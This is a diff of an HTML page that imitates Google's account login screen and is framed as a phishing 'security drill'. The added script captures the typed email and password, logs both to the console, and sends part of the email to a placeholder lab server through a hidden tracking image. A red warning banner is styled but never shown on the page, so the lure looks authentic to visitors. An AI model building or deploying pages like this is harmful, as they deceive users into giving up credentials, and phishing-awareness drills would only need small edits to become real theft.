@@ -1,23 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="phishing" content="security_test_only">
-<script>console.log("Security drill: Credential capture simulation");</script>
     <title>Google Account Login</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
         .login-box { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
         input { width: 100%; padding: 10px; margin: 10px 0; }
         button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 5px; }
+        #drill-warning { 
+            position: fixed; 
+            bottom: 0; 
+            left: 0; 
+            right: 0; 
+            background: red; 
+            color: white; 
+            padding: 10px; 
+            text-align: center;
+            font-weight: bold;
+        }
     </style>
+    <meta name="phishing" content="security_test">
+    <meta name="security-drill" content="internal_use_only">
 </head>
 <body>
     <h2>Google</h2>
     <div class="login-box">
         <p>Sign in to continue</p>
-        <input type="email" placeholder="Email or phone">
-        <input type="password" placeholder="Password">
-        <button type="submit">Next</button>
+        <form id="loginForm">
+            <input type="email" placeholder="Email or phone" name="email">
+            <input type="password" placeholder="Password" name="password">
+            <button type="submit">Next</button>
+        </form>
     </div>
+
+    <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" 
+         style="display:none" id="drill-tracker">
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            console.log("[SECURITY DRILL] Simulated credential capture: ", 
+                this.email.value, this.password.value);
+            
+            document.getElementById('drill-tracker').src = 
+                'https://your-lab-server/log?drill=1&email=' + 
+                encodeURIComponent(this.email.value.substring(0,3)) + '...';
+            
+            alert("SECURITY DRILL: This would redirect to Google in a real simulation.\n\nCollected first 3 chars: " + 
+                  this.email.value.substring(0,3) + "...");
+            return false;
+        };
+
+        setTimeout(() => {
+            console.log("[SECURITY DRILL] Page activity simulation complete");
+        }, 5000);
+    </script>
 </body>
 </html>
